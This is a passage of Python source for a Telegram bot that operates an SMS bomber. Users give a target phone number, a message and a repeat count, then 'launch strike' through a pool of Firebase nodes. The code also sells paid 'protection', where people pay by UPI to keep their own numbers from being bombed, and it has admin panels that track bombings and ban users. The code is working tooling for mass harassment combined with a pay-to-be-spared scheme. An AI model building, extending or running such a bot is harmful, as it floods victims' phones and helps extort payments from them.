        await msg.answer(styled_box("🛡️ ᴘʀᴏᴛᴇᴄᴛᴇᴅ", f"🚫 {sc('ʏᴀʜ ɴᴜᴍʙᴇʀ ᴘʀᴏᴛᴇᴄᴛᴇᴅ ʜᴀɪ')}\n\n{sc('ʏᴏᴜ ᴄᴀɴɴᴏᴛ ʙᴏᴍʙ ᴛʜɪꜱ ɴᴜᴍʙᴇʀ.')}\n\n<i>{sc('ᴄᴏɴᴛᴀᴄᴛ ᴀᴅᴍɪɴ ғᴏʀ ᴍᴏʀᴇ ɪɴғᴏ')}</i>"), parse_mode="HTML")
        await state.clear()
        return

    await state.update_data(number=number)
    await state.set_state(Form.bomb_message)
    await msg.answer(sc("💬 ᴍᴇꜱꜱᴀɢᴇ ᴅᴀʟɪʏᴇ\n\nᴍᴇssᴀɢᴇ ᴛʏᴘᴇ ᴋᴀʀɪʏᴇ ᴊᴏ ʙʜᴇᴊɴᴀ ʜᴀɪ\n\n<i>ꜱᴇɴᴅ /cancel ᴛᴏ ᴀʙᴏʀᴛ</i>"), parse_mode="HTML", reply_markup=kb([[("❌ " + sc("ᴄᴀɴᴄᴇʟ"), "home")]]))

@R.message(Form.bomb_message)
async def process_message(msg: types.Message, state: FSMContext):
    message = msg.text.strip()
    if not message:
        await msg.answer(sc("❌ ᴍᴇssᴀɢᴇ ᴋᴏ ᴋʜᴀʟɪ ɴʜɪ ᴄʜʜᴏᴅᴀ ᴊᴀ sᴀᴋᴛᴀ!"))
        return
    await state.update_data(message=message)
    await state.set_state(Form.bomb_count)
    await msg.answer(f"{sc('🔁ᴋɪᴛɴᴇ ʙʜᴇᴊɴᴇ ʜᴀɪ?')}\n\n{sc('ᴋɪᴛɴᴇ ᴍᴇssᴀɢᴇs ʙʜᴇᴊɴᴇ ʜᴀɪ?')}\n{sc('ᴍᴀxɪᴍᴜᴍ')}: {MAX_COUNT}\n\n<i>{sc('ꜱᴇɴᴅ /cancel ᴛᴏ ᴀʙᴏʀᴛ')}</i>", parse_mode="HTML", reply_markup=kb([[("❌ " + sc("ᴄᴀɴᴄᴇʟ"), "home")]]))

@R.message(Form.bomb_count)
async def process_count(msg: types.Message, state: FSMContext):
    try:
        count = int(msg.text.strip())
        if count < 1 or count > MAX_COUNT:
            await msg.answer(f"{sc('❌ ᴄᴏᴜɴᴛ 1 sᴇ ᴋᴀᴍ ɴʜɪ ʜᴏɴᴀ ᴄʜᴀʜɪʏᴇ')}{MAX_COUNT}!")
            return
    except:
        await msg.answer(sc("❌ sᴀʜɪ ɴᴜᴍʙᴇʀ ᴅᴀʟᴇ!"))
        return
    
    data = await state.get_data()
    number, message, uid = data.get("number"), data.get("message"), msg.from_user.id
    await state.clear()
    
    await msg.answer(
        styled_box("ᴄᴏɴꜰɪʀᴍ ꜱᴛʀɪᴋᴇ",
        f"📞 {sc('ᴛᴀʀɢᴇᴛ')}: <code>{number}</code>\n"
        f"💬 {sc('ᴍᴇꜱꜱᴀɢᴇ')}: <code>{message[:30]}{'...' if len(message) > 30 else ''}</code>\n"
        f"🔁 {sc('ᴄᴏᴜɴᴛ')}: <b>{count}</b>\n\n"
        f"<b>{sc('ᴛᴏʜ sᴛᴀʀᴛ ᴋᴀʀᴇ?')}</b>"),
        parse_mode="HTML",
        reply_markup=kb([
            [("✅ " + sc("ʟᴀᴜɴᴄʜ ꜱᴛʀɪᴋᴇ"), f"bomb:confirm:{number}:{count}")],
            [("❌ " + sc("ᴄᴀɴᴄᴇʟ"), "home")]
        ])
    )
    await state.update_data(bomb_message=message)

@R.callback_query(F.data.startswith("bomb:confirm:"))
async def cb_bomb_confirm(cq: types.CallbackQuery, state: FSMContext):
    parts = cq.data.split(":")
    number, count = parts[2], int(parts[3])
    data = await state.get_data()
    message = data.get("bomb_message", "Hello!")
    await state.clear()
    
    await cq.answer(sc("💣 ʟᴀᴜɴᴄʜɪɴɢ..."))
    await cq.message.edit_text(sc("⏳ ɪɴɪᴛɪᴀᴛɪɴɢ ꜱᴇǫᴜᴇɴᴄᴇ..."), parse_mode="HTML")
    await start_bombing(cq.bot, cq.from_user.id, number, message, count)

# ── Protection Flow ───────────────────────────────────────
@R.callback_query(F.data == "protect:start")
async def cb_protect_start(cq: types.CallbackQuery, state: FSMContext):
    await cq.message.edit_text(
        styled_box("🛡️ ɴᴜᴍʙᴇʀ ᴘʀᴏᴛᴇᴄᴛɪᴏɴ",
        f"{sc('ᴀᴘɴᴇ ɴᴜᴍʙᴇʀ ᴋᴏ sᴍs ʙᴏᴍʙᴇʀ sᴇ ᴘʀᴏᴛᴇᴄᴛ ᴋᴀʀᴇ')}\n\n"
        f"💰 {sc('ꜰᴇᴇ')}: <b>{PROTECTION_PRICE}</b>\n"
        f"📲 {sc('ᴘᴀʏ ᴛᴏ')}: <code>{PAYMENT_UPI}</code>\n\n"
        f"{sc('ᴀꜰᴛᴇʀ ᴘᴀʏᴍᴇɴᴛ, ʀᴇǫᴜᴇꜱᴛ ꜱᴜʙᴍɪᴛ ᴋᴀʀɴᴇ ᴋᴇ ʟɪʏᴇ ɴᴇᴇᴄʜᴇ ᴄʟɪᴄᴋ ᴋᴀʀᴇɴ.')}"),
        reply_markup=kb([
            [("💸 " + sc("ᴘᴀɪᴅ"), "protect:paid")],
            [("🔙 " + sc("ʙᴀᴄᴋ"), "home")]
        ]), parse_mode="HTML")

@R.callback_query(F.data == "protect:paid")
async def cb_protect_paid(cq: types.CallbackQuery, state: FSMContext):
    await state.set_state(Form.protect_txn)
    await cq.message.edit_text(
        styled_box("ᴠᴇʀɪꜰʏ ᴘᴀʏᴍᴇɴᴛ",
        f"{sc('ᴛʀᴀɴꜱᴀᴄᴛɪᴏɴ ɪᴅ ᴅᴀʟᴇɴ (ᴜᴛʀ/ʀᴇꜰ ɴᴏ.)')}\n\n"
        f"<i>{sc('ᴇxᴀᴍᴘʟᴇ')}: T123456789012</i>"),
        reply_markup=kb([[("❌ " + sc("ᴄᴀɴᴄᴇʟ"), "home")]]), parse_mode="HTML")

@R.message(Form.protect_txn)
async def process_protect_txn(msg: types.Message, state: FSMContext):
    if not msg.text:
        await msg.answer(sc("❌ ᴘʟᴇᴀꜱᴇ ꜱᴇɴᴅ ᴛᴇxᴛ!"))
        return
    txn = msg.text.strip()
    if len(txn) < 5:
        await msg.answer(sc("❌ ɪɴᴠᴀʟɪᴅ ᴛʀᴀɴꜱᴀᴄᴛɪᴏɴ ɪᴅ!"))
        return
    await state.update_data(txn_id=txn)
    await state.set_state(Form.protect_number)
    await msg.answer(
        styled_box("ᴇɴᴛᴇʀ ɴᴜᴍʙᴇʀ",
        f"{sc('ᴘʜᴏɴᴇ ɴᴜᴍʙᴇʀ ᴅᴀʟᴇɴ ᴊɪsᴇ ᴘʀᴏᴛᴇᴄᴛ ᴋᴀʀɴᴀ ʜᴀɪ')}\n\n"
        f"{sc('ꜰᴏʀᴍᴀᴛ')}: <code>+919876543210</code>"),
        reply_markup=kb([[("❌ " + sc("ᴄᴀɴᴄᴇʟ"), "home")]]), parse_mode="HTML")

@R.message(Form.protect_number)
async def process_protect_number(msg: types.Message, state: FSMContext):
    if not msg.text:
        await msg.answer(sc("❌ sᴀʜɪ ɴᴜᴍʙᴇʀ ʙʜᴇᴊᴇ!"))
        return
    
    # FIX: Removed spaces/dashes and fixed regex escape
    number = msg.text.strip().replace(" ", "").replace("-", "")
    if not re.match(r'^\+?[0-9]{8,15}$', number):
        await msg.answer(sc("❌ ɢᴀʟᴀᴛ ɴᴜᴍʙᴇʀ! ᴜꜱᴇ: +919876543210"))
        return
    
    data = await state.get_data()
    txn_id = data.get("txn_id")
    uid = msg.from_user.id
    username = msg.from_user.username or msg.from_user.first_name
    
    d = load()
    # Add to pending requests
    req_id = str(int(time.time()))
    request = {
        "id": req_id,
        "user_id": uid,
        "username": username,
        "number": number,
        "txn_id": txn_id,
        "status": "pending",
        "time": datetime.now().isoformat()
    }
    d["protection_requests"].append(request)
    save(d)
    
    await state.clear()
    await msg.answer(styled_box("ʀᴇǫᴜᴇꜱᴛ ꜱᴇɴᴛ",
        f"✅ {sc('ᴀᴀᴘᴋᴀ ᴘʀᴏᴛᴇᴄᴛ ʀᴇǫᴜᴇꜱᴛ ᴀᴅᴍɪɴ ᴋᴇ ᴘᴀᴀꜱ ʙʜᴇᴊ ᴅɪʏᴀ ɢᴀʏᴀ ʜᴀɪ')}\n\n"
        f"{sc('ᴀᴘᴘʀᴏᴠᴀʟ ᴛᴀᴋ ʀᴜᴋᴇ')}"), parse_mode="HTML")
    
    # Notify Admin
    admin_text = styled_box("🛡️ ɴᴇᴡ ᴘʀᴏᴛᴇᴄᴛɪᴏɴ ʀᴇǫᴜᴇꜱᴛ",
        f"👤 {sc('ᴜꜱᴇʀ')}: <code>{uid}</code> (@{username})\n"
        f"📞 {sc('ɴᴜᴍʙᴇʀ')}: <code>{number}</code>\n"
        f"💸 {sc('ᴛʀᴀɴꜱᴀᴄᴛɪᴏɴ')}: <code>{txn_id}</code>\n\n"
        f"<i>{sc('ᴀᴘᴘʀᴏᴠᴇ ᴛᴏ ᴘʀᴏᴛᴇᴄᴛ ᴛʜɪꜱ ɴᴜᴍʙᴇʀ.')}</i>")
    
    kb_rows = [
        [("✅ " + sc("ᴀᴘᴘʀᴏᴠᴇ"), f"admin:prot_approve:{req_id}")],
        [("❌ " + sc("ʀᴇᴊᴇᴄᴛ"), f"admin:prot_reject:{req_id}")]
    ]
    
    # FIX: Ensure OWNER_ID is always notified and log errors instead of hiding them
    admins_to_notify = set(d.get("admins", []))
    admins_to_notify.add(OWNER_ID)
    
    for admin_id in admins_to_notify:
        try:
            await msg.bot.send_message(admin_id, admin_text, reply_markup=kb(kb_rows), parse_mode="HTML")
        except Exception as e:
            log.warning(f"Could not notify admin {admin_id}: {e}")

# ── Admin Panel ────────────────────────────────────────────
@R.callback_query(F.data == "admin:panel")
async def cb_admin_panel(cq: types.CallbackQuery):
    uid = cq.from_user.id
    d = load()
    if not is_admin(uid, d):
        await cq.answer(sc("🚫 ᴀᴅᴍɪɴ ᴏɴʟʏ!"), show_alert=True)
        return
    
    fb_count = len(d.get("firebases", []))
    pending_reqs = len([r for r in d.get("protection_requests", []) if r["status"] == "pending"])
    
    text = styled_box("ᴄᴏᴍᴍᴀɴᴅ ᴄᴇɴᴛʀᴀʟ",
        f"🔥 {sc('ɴᴏᴅᴇꜱ')}: <b>{fb_count}</b>\n"
        f"📅 {sc('ꜱᴄʜᴇᴅᴜʟᴇꜱ')}: <b>{len(d.get('schedules', []))}</b>\n"
        f"📊 {sc('ᴛᴏᴛᴀʟ ꜱᴇɴᴛ')}: <b>{d.get('stats', {}).get('total_sent', 0)}</b>\n"
        f"👥 {sc('ᴀᴅᴍɪɴꜱ')}: <b>{len(d.get('admins', []))}</b>\n"
        f"🚫 {sc('ʙᴀɴɴᴇᴅ')}: <b>{len(d.get('banned', []))}</b>\n"
        f"🛡️ {sc('ᴘᴇɴᴅɪɴɢ ʀᴇǫꜱ')}: <b>{pending_reqs}</b>")
    await cq.message.edit_text(text, reply_markup=admin_panel_kb(d), parse_mode="HTML")

# ── Protection Admin Management ───────────────────────────
@R.callback_query(F.data == "admin:protection")
async def cb_admin_protection(cq: types.CallbackQuery):
    d = load()
    requests = d.get("protection_requests", [])
    pending = [r for r in requests if r["status"] == "pending"]
    
    if not pending:
        await cq.answer(sc("✅ ɴᴏ ᴘᴇɴᴅɪɴɢ ʀᴇǫᴜᴇꜱᴛꜱ!"), show_alert=True)
        return
    
    text = styled_box("🛡️ ᴘʀᴏᴛᴇᴄᴛɪᴏɴ ʀᴇǫᴜᴇꜱᴛꜱ", "")
    kb_rows = []
    
    for r in pending:
        text += f"👤 <code>{r['user_id']}</code> | 📞 <code>{r['number']}</code>\n"
        text += f"💸 Txn: <code>{r['txn_id']}</code>\n\n"
        kb_rows.append([
            (sc("✅ ᴀᴘᴘʀᴏᴠᴇ"), f"admin:prot_approve:{r['id']}"),
            (sc("❌ ʀᴇᴊᴇᴄᴛ"), f"admin:prot_reject:{r['id']}")
        ])
    
    kb_rows.append([("🔙 " + sc("ʙᴀᴄᴋ"), "admin:panel")])
    await cq.message.edit_text(text, reply_markup=kb(kb_rows), parse_mode="HTML")

@R.callback_query(F.data.startswith("admin:prot_approve:"))
async def cb_admin_prot_approve(cq: types.CallbackQuery):
    req_id = cq.data.split(":")[2]
    d = load()
    
    req_found = None
    for r in d["protection_requests"]:
        if r["id"] == req_id:
            req_found = r
            break
            
    if req_found:
        req_found["status"] = "approved"
        # Add to protected numbers if not already there
        if req_found["number"] not in d["protected_numbers"]:
            d["protected_numbers"].append(req_found["number"])
        save(d)
        
        await cq.answer(sc("✅ ɴᴜᴍʙᴇʀ ᴘʀᴏᴛᴇᴄᴛᴇᴅ!"), show_alert=True)
        
        # Notify User
        try:
            await cq.bot.send_message(req_found["user_id"], 
                styled_box("🛡️ ᴀᴘᴘʀᴏᴠᴇᴅ", 
                f"✅ {sc('ʏᴏᴜʀ ɴᴜᴍʙᴇʀ')} <code>{req_found['number']}</code> {sc('ɪꜱ ɴᴏᴡ ᴘʀᴏᴛᴇᴄᴛᴇᴅ!')}\n\n"
                f"{sc('ᴀʙ ᴀᴀᴘᴋᴇ ɴᴜᴍʙᴇʀ ᴘᴇ ᴋᴏɪ ʙᴏᴍʙᴇʀ ɴʜɪ ᴄʜᴀʟᴀ sᴀᴋᴛᴀ')}"), 
                parse_mode="HTML")
        except: pass
        
        await cb_admin_protection(cq)
    else:
        await cq.answer(sc("❌ ʀᴇǫᴜᴇꜱᴛ ɴᴏᴛ ꜰᴏᴜɴᴅ!"), show_alert=True)

@R.callback_query(F.data.startswith("admin:prot_reject:"))
async def cb_admin_prot_reject(cq: types.CallbackQuery):
    req_id = cq.data.split(":")[2]
    d = load()
    
    req_found = None
    for r in d["protection_requests"]:
        if r["id"] == req_id:
            req_found = r
            break
            
    if req_found:
        req_found["status"] = "rejected"
        save(d)
        
        await cq.answer(sc("❌ ʀᴇǫᴜᴇꜱᴛ ʀᴇᴊᴇᴄᴛᴇᴅ!"), show_alert=True)
        
        # Notify User
        try:
            await cq.bot.send_message(req_found["user_id"], 
                styled_box("🛡️ ʀᴇᴊᴇᴄᴛᴇᴅ", 
                f"❌ {sc('ʏᴏᴜʀ ᴘʀᴏᴛᴇᴄᴛɪᴏɴ ʀᴇǫᴜᴇꜱᴛ ꜰᴏʀ')} <code>{req_found['number']}</code> {sc('ᴡᴀꜱ ʀᴇᴊᴇᴄᴛᴇᴅ.')}\n\n"
                f"{sc('ᴘʟᴇᴀꜱᴇ ᴄʜᴇᴄᴋ ʏᴏᴜʀ ᴘᴀʏᴍᴇɴᴛ ᴅᴇᴛᴀɪʟꜱ ᴀɴᴅ ᴛʀʏ ᴀɢᴀɪɴ.')}"), 
                parse_mode="HTML")
        except: pass
        
        await cb_admin_protection(cq)
    else:
        await cq.answer(sc("❌ ʀᴇǫᴜᴇꜱᴛ ɴᴏᴛ ꜰᴏᴜɴᴅ!"), show_alert=True)

# ── Database Backup & Restore ─────────────────────────────
@R.callback_query(F.data == "admin:db_tools")
async def cb_admin_db_tools(cq: types.CallbackQuery):
    await cq.message.edit_text(
        styled_box("💾 ᴅᴀᴛᴀʙᴀꜱᴇ ᴛᴏᴏʟꜱ",
        f"{sc('ᴍᴀɴᴀɢᴇ ʏᴏᴜʀ ʙᴏᴛ ᴅᴀᴛᴀʙᴀꜱᴇ.')}\n\n"
        f"📥 {sc('ʙᴀᴄᴋᴜᴘ')}: {sc('ᴅᴏᴡɴʟᴏᴀᴅ ᴄᴜʀʀᴇɴᴛ ᴅᴀᴛᴀ')}\n"
        f"📤 {sc('ʀᴇꜱᴛᴏʀᴇ')}: {sc('ᴜᴘʟᴏᴀᴅ ᴀɴᴅ ʀᴇᴘʟᴀᴄᴇ ᴅᴀᴛᴀ')}\n\n"
        f"<i>{sc('ᴡᴀʀɴɪɴɢ: ʀᴇꜱᴛᴏʀɪɴɢ ᴡɪʟʟ ᴏᴠᴇʀᴡʀɪᴛᴇ ᴄᴜʀʀᴇɴᴛ ᴅᴀᴛᴀ!')}</i>"),
        reply_markup=kb([
            [("📥 " + sc("ᴅᴏᴡɴʟᴏᴀᴅ ʙᴀᴄᴋᴜᴘ"), "admin:db_backup")],
            [("📤 " + sc("ʀᴇꜱᴛᴏʀᴇ ꜰʀᴏᴍ ꜰɪʟᴇ"), "admin:db_restore_prompt")],
            [("🔙 " + sc("ʙᴀᴄᴋ"), "admin:panel")]
        ]), parse_mode="HTML")

@R.callback_query(F.data == "admin:db_backup")
async def cb_admin_db_backup(cq: types.CallbackQuery):
    if not os.path.exists(DATA_FILE):
        await cq.answer(sc("❌ ɴᴏ ᴅᴀᴛᴀʙᴀꜱᴇ ꜰɪʟᴇ ꜰᴏᴜɴᴅ!"), show_alert=True)
        return
    
    await cq.answer(sc("📥 ᴘʀᴇᴘᴀʀɪɴɢ ʙᴀᴄᴋᴜᴘ..."))
    try:
        file = FSInputFile(DATA_FILE)
        await cq.bot.send_document(cq.from_user.id, document=file, caption=sc("💾 ʜᴇʀᴇ ɪꜱ ʏᴏᴜʀ ᴅᴀᴛᴀʙᴀꜱᴇ ʙᴀᴄᴋᴜᴘ."))
    except Exception as e:
        await cq.answer(sc(f"❌ ᴇʀʀᴏʀ: {str(e)}"), show_alert=True)

@R.callback_query(F.data == "admin:db_restore_prompt")
async def cb_admin_db_restore_prompt(cq: types.CallbackQuery):
    await cq.message.edit_text(
        styled_box("📤 ʀᴇꜱᴛᴏʀᴇ ᴅᴀᴛᴀʙᴀꜱᴇ",
        f"{sc('ᴘʟᴇᴀꜱᴇ ꜱᴇɴᴅ ᴛʜᴇ ᴊꜱᴏɴ ʙᴀᴄᴋᴜᴘ ꜰɪʟᴇ ʜᴇʀᴇ.')}\n\n"
        f"<i>{sc('ᴡᴀʀɴɪɴɢ: ᴛʜɪꜱ ᴡɪʟʟ ᴏᴠᴇʀᴡʀɪᴛᴇ ᴀʟʟ ᴄᴜʀʀᴇɴᴛ ᴅᴀᴛᴀ!')}</i>"),
        reply_markup=kb([[("🔙 " + sc("ᴄᴀɴᴄᴇʟ"), "admin:db_tools")]]), parse_mode="HTML")

# Handler for restoring DB via Document (Simple Implementation)
@R.message(F.document)
async def handle_db_restore(msg: types.Message, state: FSMContext):
    d = load()
    if not is_admin(msg.from_user.id, d): return
    
    if msg.document.file_name and msg.document.file_name.endswith('.json'):
        file_path = f"restore_{msg.document.file_unique_id}.json"
        await msg.bot.download(msg.document.file_id, destination=file_path)
        
        try:
            with open(file_path, 'r') as f:
                new_data = json.load(f)
            
            if "admins" in new_data and "firebases" in new_data:
                save(new_data)
                os.remove(file_path)
                await msg.answer(styled_box("✅ ʀᴇꜱᴛᴏʀᴇ ᴅᴏɴᴇ", f"{sc('ᴅᴀᴛᴀʙᴀꜱᴇ ʜᴀꜱ ʙᴇᴇɴ ꜱᴜᴄᴄᴇꜱꜱꜰᴜʟʟʏ ʀᴇꜱᴛᴏʀᴇᴅ!')}"), parse_mode="HTML")
            else:
                os.remove(file_path)
                await msg.answer(sc("❌ ɪɴᴠᴀʟɪᴅ ᴅᴀᴛᴀʙᴀꜱᴇ ꜰᴏʀᴍᴀᴛ!"))
        except Exception as e:
            if os.path.exists(file_path): os.remove(file_path)
            await msg.answer(sc(f"❌ ᴇʀʀᴏʀ ʀᴇꜱᴛᴏʀɪɴɢ: {str(e)}"))

# ── Add Firebase ──────────────────────────────────────────
@R.callback_query(F.data == "admin:fb_add")
async def cb_fb_add(cq: types.CallbackQuery, state: FSMContext):
    uid = cq.from_user.id
    d = load()
    if not is_admin(uid, d):
        await cq.answer(sc("🚫 ᴀᴅᴍɪɴ ᴏɴʟʏ!"), show_alert=True)
        return
    await state.set_state(Form.fb_add_url)
    await cq.message.edit_text(
        styled_box("ᴀᴅᴅ ꜰɪʀᴇʙᴀꜱᴇ ɴᴏᴅᴇ", f"{sc('ꜱᴇɴᴅ ꜰɪʀᴇʙᴀꜱᴇ ᴅᴀᴛᴀʙᴀꜱᴇ ᴜʀʟ')}\n\n<code>https://your-project.firebaseio.com</code>\n\n<i>{sc('ꜱᴇɴᴅ /cancel ᴛᴏ ᴀʙᴏʀᴛ')}</i>"),
        reply_markup=kb([[("❌ " + sc("ᴄᴀɴᴄᴇʟ"), "admin:panel")]]), parse_mode="HTML")

@R.message(Form.fb_add_url)
async def process_fb_url(msg: types.Message, state: FSMContext):
    url = msg.text.strip()
    if not url.startswith("https://"):
        await msg.answer(sc("❌ ᴜʀʟ ᴍᴜꜱᴛ ꜱᴛᴀʀᴛ ᴡɪᴛʜ https://"))
        return
    await state.update_data(fb_url=url.rstrip("/"))
    await state.set_state(Form.fb_add_api)
    await msg.answer(sc("🔑 ᴇɴᴛᴇʀ ꜰɪʀᴇʙᴀꜱᴇ ᴀᴘɪ ᴋᴇʏ\n\n<i>ꜱᴇɴᴅ 'skip' ᴛᴏ ꜱᴋɪᴘ</i>\n\n<i>ꜱᴇɴᴅ /cancel ᴛᴏ ᴀʙᴏʀᴛ</i>"), parse_mode="HTML", reply_markup=kb([[("❌ " + sc("ᴄᴀɴᴄᴇʟ"), "admin:panel")]]))

@R.message(Form.fb_add_api)
async def process_fb_api(msg: types.Message, state: FSMContext):
    api_key = msg.text.strip()
    if api_key.lower() == "skip": api_key = ""
    data = await state.get_data()
    d = load()
    d["firebases"].append({"id": str(int(time.time())), "url": data.get("fb_url"), "api_key": api_key})
    save(d)
    await state.clear()
    await msg.answer(sc("✅ ꜰɪʀᴇʙᴀꜱᴇ ɴᴏᴅᴇ ᴀᴅᴅᴇᴅ!"), reply_markup=admin_panel_kb(d), parse_mode="HTML")

# ── List Firebases ────────────────────────────────────────
@R.callback_query(F.data == "admin:fb_list")
async def cb_fb_list(cq: types.CallbackQuery):
    d = load()
    fbs = d.get("firebases", [])
    if not fbs:
        await cq.answer(sc("❌ ɴᴏ ꜰɪʀᴇʙᴀꜱᴇ ɴᴏᴅᴇꜱ ᴀᴅᴅᴇᴅ!"), show_alert=True)
        return
    text = styled_box("ꜰɪʀᴇʙᴀꜱᴇ ɴᴏᴅᴇꜱ", "\n".join([f"🔥 {sc('ɴᴏᴅᴇ')} #{i+1} 🔑 {'✅' if fb.get('api_key') else '❌'}" for i, fb in enumerate(fbs)]))
    rows = [[(f"🗑 {sc('ᴅᴇʟᴇᴛᴇ')} #{i+1}", f"admin:fb_del:{fb['id']}") for i, fb in enumerate(fbs)]]
    rows.append([("◀️ " + sc("ʙᴀᴄᴋ"), "admin:panel")])
    await cq.message.edit_text(text, reply_markup=kb(rows), parse_mode="HTML")

@R.callback_query(F.data.startswith("admin:fb_del:"))
async def cb_fb_del(cq: types.CallbackQuery):
    fb_id = cq.data.split(":")[2]
    d = load()
    d["firebases"] = [fb for fb in d.get("firebases", []) if fb["id"] != fb_id]
    save(d)
    await cq.answer(sc("🗑 ɴᴏᴅᴇ ᴅᴇʟᴇᴛᴇᴅ!"), show_alert=True)
    await cb_fb_list(cq)

# ── Admins ──────────────────────────────────────────────────
@R.callback_query(F.data == "admin:admins")
async def cb_admins(cq: types.CallbackQuery):
    d = load()
    admins = d.get("admins", [OWNER_ID])
    text = styled_box("ᴀᴅᴍɪɴ ᴍᴀɴᴀɢᴇᴍᴇɴᴛ", "\n".join([f"👑 <code>{aid}</code> (Owner)" if aid == OWNER_ID else f"👤 <code>{aid}</code>" for aid in admins]))
    rows = [[(f"🗑 {sc('ʀᴇᴍᴏᴠᴇ')} {aid}", f"admin:admin_del:{aid}") for aid in admins if aid != OWNER_ID]]
    rows.append([("➕ " + sc("ᴀᴅᴅ ᴀᴅᴍɪɴ"), "admin:admin_add")])
    rows.append([("◀️ " + sc("ʙᴀᴄᴋ"), "admin:panel")])
    await cq.message.edit_text(text, reply_markup=kb(rows), parse_mode="HTML")

@R.callback_query(F.data == "admin:admin_add")
async def cb_admin_add(cq: types.CallbackQuery, state: FSMContext):
    await state.set_state(Form.bomb_number) # Reusing state for simplicity
    await cq.message.edit_text(sc("➕ ᴀᴅᴅ ᴀᴅᴍɪɴ\n\nꜱᴇɴᴅ ᴛᴇʟᴇɢʀᴀᴍ ᴜꜱᴇʀ ɪᴅ:\n\n<i>ꜱᴇɴᴅ /cancel ᴛᴏ ᴀʙᴏʀᴛ</i>"), parse_mode="HTML", reply_markup=kb([[("❌ " + sc("ᴄᴀɴᴄᴇʟ"), "admin:panel")]]))

@R.message(Form.bomb_number)
async def process_admin_add(msg: types.Message, state: FSMContext):
    try:
        admin_id = int(msg.text.strip())
        d = load()
        if admin_id not in d.get("admins", []):
            d["admins"].append(admin_id)
            save(d)
            await state.clear()
            await msg.answer(f"{sc('✅ ᴀᴅᴍɪɴ ᴀᴅᴅᴇᴅ!')}\n\n👤 <code>{admin_id}</code>", parse_mode="HTML", reply_markup=admin_panel_kb(d))
        else:
             await msg.answer(sc("❌ ᴜꜱᴇʀ ɪꜱ ᴀʟʀᴇᴀᴅʏ ᴀɴ ᴀᴅᴍɪɴ!"))
    except:
        await msg.answer(sc("❌ ɪɴᴠᴀʟɪᴅ ᴜꜱᴇʀ ɪᴅ!"))

@R.callback_query(F.data.startswith("admin:admin_del:"))
async def cb_admin_del(cq: types.CallbackQuery):
    admin_id = int(cq.data.split(":")[2])
    if admin_id == OWNER_ID:
        await cq.answer(sc("❌ ᴄᴀɴ'ᴛ ʀᴇᴍᴏᴠᴇ ᴏᴡɴᴇʀ!"), show_alert=True)
        return
    d = load()
    if admin_id in d.get("admins", []):
        d["admins"].remove(admin_id)
        save(d)
        await cq.answer(sc("🗑 ʀᴇᴍᴏᴠᴇᴅ!"), show_alert=True)
        await cb_admins(cq)

# ── Ban/Unban ──────────────────────────────────────────────
@R.callback_query(F.data == "admin:ban")
async def cb_ban(cq: types.CallbackQuery, state: FSMContext):
    await state.set_state(Form.schedule_name) # Reusing state
    await cq.message.edit_text(sc("🚫 ʙᴀɴ ᴜꜱᴇʀ\n\nꜱᴇɴᴅ ᴜꜱᴇʀ ɪᴅ ᴛᴏ ʙᴀɴ:\n\n<i>ꜱᴇɴᴅ /cancel ᴛᴏ ᴀʙᴏʀᴛ</i>"), parse_mode="HTML", reply_markup=kb([[("❌ " + sc("ᴄᴀɴᴄᴇʟ"), "admin:panel")]]))

@R.message(Form.schedule_name)
async def process_ban(msg: types.Message, state: FSMContext):
    try:
        uid = int(msg.text.strip())
        d = load()
        if uid not in d.get("banned", []):
            d["banned"].append(uid)
            save(d)
            await state.clear()
            await msg.answer(f"{sc('🚫 ᴜꜱᴇʀ ʙᴀɴɴᴇᴅ!')}\n\n👤 <code>{uid}</code>", parse_mode="HTML", reply_markup=admin_panel_kb(d))
        else:
            await msg.answer(sc("❌ ᴜꜱᴇʀ ɪꜱ ᴀʟʀᴇᴀᴅʏ ʙᴀɴɴᴇᴅ!"))
    except:
        await msg.answer(sc("❌ ɪɴᴠᴀʟɪᴅ ᴜꜱᴇʀ ɪᴅ!"))

@R.callback_query(F.data == "admin:unban")
async def cb_unban(cq: types.CallbackQuery):
    d = load()
    banned = d.get("banned", [])
    if not banned:
        await cq.answer(sc("✅ ɴᴏ ʙᴀɴɴᴇᴅ ᴜꜱᴇʀꜱ!"), show_alert=True)
        return
    rows = [[(f"🔓 {sc('ᴜɴʙᴀɴ')} {uid}", f"admin:unban_do:{uid}") for uid in banned]]
    rows.append([("◀️ " + sc("ʙᴀᴄᴋ"), "admin:panel")])
    await cq.message.edit_text(sc("✅ ᴜɴʙᴀɴ ᴜꜱᴇʀ\n\nᴛᴀᴘ ᴛᴏ ᴜɴʙᴀɴ:"), reply_markup=kb(rows), parse_mode="HTML")

@R.callback_query(F.data.startswith("admin:unban_do:"))
async def cb_unban_do(cq: types.CallbackQuery):
    uid = int(cq.data.split(":")[2])
    d = load()
    if uid in d.get("banned", []):
        d["banned"].remove(uid)
        save(d)
        await cq.answer(f"✅ {uid} {sc('ᴜɴʙᴀɴɴᴇᴅ!')}", show_alert=True)
        await cb_unban(cq)

# ── Global Stats ──────────────────────────────────────────
@R.callback_query(F.data == "admin:stats")
async def cb_admin_stats(cq: types.CallbackQuery):
    d = load()
    stats = d.get("stats", {"total_sent": 0, "total_failed": 0, "total_bombings": 0})
    total = stats.get("total_sent", 0) + stats.get("total_failed", 0)
    rate = round(stats.get("total_sent", 0) / total * 100, 1) if total > 0 else 0
    text = styled_box("ɢʟᴏʙᴀʟ ᴛᴇʟᴇᴍᴇᴛʀʏ",
        f"🔥 {sc('ɴᴏᴅᴇꜱ')}: <b>{len(d.get('firebases', []))}</b>\n"
        f"📅 {sc('ꜱᴄʜᴇᴅᴜʟᴇꜱ')}: <b>{len(d.get('schedules', []))}</b>\n"
        f"👥 {sc('ᴀᴅᴍɪɴꜱ')}: <b>{len(d.get('admins', []))}</b>\n"
        f"🚫 {sc('ʙᴀɴɴᴇᴅ')}: <b>{len(d.get('banned', []))}</b>\n\n"
        f"✅ {sc('ᴛᴏᴛᴀʟ ꜱᴇɴᴛ')}: <b>{stats.get('total_sent', 0)}</b>\n"
        f"❌ {sc('ᴛᴏᴛᴀʟ ꜰᴀɪʟᴇᴅ')}: <b>{stats.get('total_failed', 0)}</b>\n"
        f"💣 {sc('ʙᴏᴍʙɪɴɢꜱ ʀᴜɴ')}: <b>{stats.get('total_bombings', 0)}</b>\n"
        f"📈 {sc('ꜱᴜᴄᴄᴇꜱꜱ ʀᴀᴛᴇ')}: <b>{rate}%</b>")
    await cq.message.edit_text(text, reply_markup=back_button("admin:panel"), parse_mode="HTML")

# ════════════════════════════════════════════════════════════
# MAIN
# ════════════════════════════════════════════════════════════
async def main():
    bot = Bot(token=BOT_TOKEN)
